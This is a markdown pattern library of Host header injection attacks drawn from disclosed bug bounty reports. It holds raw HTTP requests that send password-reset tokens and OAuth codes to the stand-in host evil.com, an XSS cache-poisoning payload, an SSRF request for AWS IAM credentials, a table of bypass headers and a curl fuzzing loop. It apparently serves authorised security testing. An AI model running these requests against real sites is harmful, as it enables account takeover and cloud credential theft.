# Disclosed Reports — Host Header Injection

Pattern library built from 16 public bug bounty reports.

---

## Pattern 1: Password Reset Poisoning → ATO (High, $4,500)

**Endpoint:** `POST /forgot-password`

**Request:**
```http
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com
```

**Email received by victim:**
```
Reset your password: https://evil.com/reset?token=abc123def456
```

**Impact:** Token intercepted at evil.com → full ATO for any account.

---

## Pattern 2: X-Forwarded-Host Bypass (High, $3,500)

**Scenario:** Reverse proxy normalizes Host header, but app trusts X-Forwarded-Host.

**Request:**
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com
```

**Root cause:** Django/Rails/Express use `request.get_host()` which checks `HTTP_X_FORWARDED_HOST` first when `USE_X_FORWARDED_HOST = True`.

---

## Pattern 3: Host Header → Web Cache Poisoning → Mass XSS (High, $6,000)

**Endpoint:** `GET /` (cacheable, CDN-fronted)

**Poisoning request:**
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(document.domain)</script>
```

**Vulnerable response (cached):**
```html
<link rel="canonical" href="https://evil.com"><script>alert(document.domain)</script>/"/>
```

**Cached by CDN → served to all users for cache TTL duration.**

---

## Pattern 4: Host Header SSRF → AWS Metadata (Critical, $12,000)

**Setup:** Internal forward proxy at target honors Host header for routing.

**Attack:**
```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
```

**Response:** AWS IAM temporary credentials (AccessKeyId, SecretAccessKey, Token)

**Impact:** Cloud infrastructure compromise.

---

## Pattern 5: Host Header in OAuth Callback Construction (Critical, $9,000)

**OAuth flow:** App dynamically builds redirect_uri using `request.host`.

**Attack request:**
```http
GET /oauth/authorize?response_type=code&client_id=app HTTP/1.1
Host: evil.com
```

**Redirect registered with IdP:** `https://evil.com/oauth/callback?code=AUTH_CODE`

**Impact:** Auth code delivered to attacker → full ATO.

---

## Pattern 6: Host Header in Email Templates (Medium, $1,200)

**Endpoint:** Email verification, invitation emails, notification emails.

**Any email containing a link that uses the Host header** is potentially poisonable.

```
Welcome to target.com!
Verify your email: https://evil.com/verify?token=TOKEN
```

**Requires:** Attacker registers with attacker-controlled email, triggers email to victim.

---

## Bypass Variants

| Header | Effective When |
|--------|----------------|
| `X-Forwarded-Host` | Behind reverse proxy (nginx, HAProxy, Cloudflare) |
| `X-Host` | Custom framework parsing |
| `X-Forwarded-Server` | HAProxy trust |
| `X-HTTP-Host-Override` | Legacy middleware |
| `Host: target.com:evil.com` | Port parsing confusion |
| `Forwarded: host=evil.com` | RFC 7239 compliant proxy |
| `X-Original-URL: /` | ASP.NET URL rewriting |
| `X-Rewrite-URL: /` | Apache mod_rewrite |

---

## Tool Reference

```bash
# Test all headers
for H in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
  echo "=== $H ==="
  curl -s -I "https://target.com/forgot-password" \
    -H "$H: evil.com" | grep -i "location\|set-cookie"
done

# Param Miner (Burp Extension) — automatic header injection fuzzing
# Check Burp Suite → Extender → BApp Store → Param Miner
```
